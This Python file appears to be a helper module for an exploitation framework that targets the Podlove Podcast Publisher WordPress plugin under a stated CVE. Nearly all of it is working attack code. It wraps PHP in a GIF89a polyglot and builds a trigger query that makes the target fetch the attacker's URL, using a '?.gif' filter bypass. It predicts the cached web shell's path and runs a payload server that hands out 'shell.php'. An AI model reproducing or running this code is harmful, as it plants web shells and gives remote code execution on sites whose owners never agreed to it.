#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Podlove Podcast Publisher helpers (CVE-2026-13001)."""

from __future__ import annotations

import hashlib
import re
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Optional

from core.framework.base_module import BaseModule

PODLOVE_PATCHED_VERSION = "4.5.2"
PODLOVE_PLUGIN_SLUGS = (
    "podlove-podcasting-plugin-for-wordpress",
    "podlove-podcast-publisher",
)


class Podlove(BaseModule):
    """Podlove Podcast Publisher mixin for scanner/exploit modules."""

    @staticmethod
    def podlove_sanitize_name(file_name: str) -> str:
        cleaned = re.sub(r"[^-a-z0-9_]+", "", (file_name or "").lower())
        return cleaned or "podcast"

    @classmethod
    def podlove_cache_shell_path(
        cls,
        wp_base: str,
        attacker_url: str,
        file_name: str,
    ) -> str:
        sanitized = cls.podlove_sanitize_name(file_name)
        digest = hashlib.md5((attacker_url.strip() + sanitized).encode()).hexdigest()
        root = (wp_base or "").rstrip("/")
        return (
            f"{root}/wp-content/cache/podlove/{digest[:2]}/{digest[2:]}/"
            f"{sanitized}_original.php"
        )

    @staticmethod
    def podlove_bypass_url(payload_url: str) -> str:
        base = (payload_url or "").strip()
        if not base:
            return ""
        return f"{base}?.gif"

    @staticmethod
    def podlove_build_polyglot(php_source: str) -> bytes:
        """Wrap framework PHP payload in a GIF89a polyglot."""
        header = (
            b"GIF89a\x39\x00\x0c\x00\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00"
            b"\x00\x00\x00\x2c\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x02\x0c"
            b"\x8c\x01\x00\x00\x00"
        )
        source = (php_source or "").strip()
        if not source.startswith("<?php"):
            source = f"<?php {source}"
        if not source.rstrip().endswith("?>"):
            source = source.rstrip() + " ?>"
        return header + source.encode("utf-8", errors="replace")

    @classmethod
    def podlove_trigger_query(
        cls,
        payload_url: str,
        file_name: str,
        width: int = 100,
        height: int = 100,
    ) -> str:
        bypass = cls.podlove_bypass_url(payload_url)
        url_hex = bypass.encode().hex()
        return (
            f"?podlove_image_cache_url={url_hex}"
            f"&podlove_file_name={file_name}"
            f"&podlove_width={width}"
            f"&podlove_height={height}"
            f"&podlove_crop=0"
        )


class PodlovePayloadServer:
    """Serve the GIF polyglot so the target Podlove instance can fetch it."""

    def __init__(self, payload: bytes, host: str = "0.0.0.0", port: int = 9999):
        self.payload = payload
        self.host = host
        self.port = int(port)
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> "PodlovePayloadServer":
        body = self.payload

        class _Handler(BaseHTTPRequestHandler):
            def do_GET(handler):
                handler.send_response(200)
                handler.send_header("Content-Type", "image/gif")
                handler.send_header("Content-Length", str(len(body)))
                handler.end_headers()
                handler.wfile.write(body)

            def log_message(handler, *args):
                return

        self._server = HTTPServer((self.host, self.port), _Handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        return self

    def stop(self) -> None:
        if self._server:
            try:
                self._server.shutdown()
            except Exception:
                pass

    def public_url(self, lhost: str) -> str:
        host = (lhost or "127.0.0.1").strip()
        return f"http://{host}:{self.port}/shell.php"
